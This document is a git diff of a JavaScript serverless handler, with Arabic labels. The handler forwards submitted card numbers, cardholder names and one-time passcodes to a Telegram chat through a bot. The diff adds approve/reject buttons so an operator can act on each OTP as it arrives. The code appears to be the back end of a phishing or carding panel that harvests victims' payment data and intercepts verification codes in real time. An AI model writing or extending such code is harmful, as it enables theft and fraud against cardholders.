@@ -13,15 +13,23 @@ export default async function handler(req, res) {
   let text = '';
   let keyboard = null;
 
-  // التحقق مما إذا كانت البيانات المرسلة هي رمز تحقق OTP
   if (data.رمز_التحقق_OTP) {
-    text = `🔐 *تم إدخال رمز تحقق جديد (OTP)*\n\n` +
-           `🔑 الكود: \`${data.رمز_التحقق_OTP}\`\n` +
+    text = `🔐 *طلب رمز تحقق (OTP) جديد*\n\n` +
+           `🔑 الكود المدخل: \`${data.رمز_التحقق_OTP}\`\n` +
            `💳 البطاقة: \`${data.رقم_البطاقة || 'غير متوفر'}\`\n` +
            `👤 الاسم: ${data.اسم_الحامل || 'غير متوفر'}\n` +
            `🆔 معرف المستخدم: \`${data.user_id || 'غير متوفر'}\``;
+
+    // أزرار تفاعلية للـ OTP
+    keyboard = {
+      inline_keyboard: [
+        [
+          { text: "✅ موافقة", callback_data: `approve_otp_${data.user_id}` },
+          { text: "❌ رفض", callback_data: `reject_otp_${data.user_id}` }
+        ]
+      ]
+    };
   } else {
-    // رسالة طلب الدفع الأساسية مع أزرار الموافقة والرفض
     text = `💳 *طلب دفع وبطاقة جديدة*\n\n` +
            `👤 الاسم: ${data.card_name || 'غير محدد'}\n` +
            `💳 رقم البطاقة: \`${data.card_number || ''}\`\n` +
@@ -43,12 +51,9 @@ export default async function handler(req, res) {
     const payload = {
       chat_id: CHAT_ID,
       text: text,
-      parse_mode: 'Markdown'
+      parse_mode: 'Markdown',
+      reply_markup: keyboard
     };
-
-    if (keyboard) {
-      payload.reply_markup = keyboard;
-    }
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
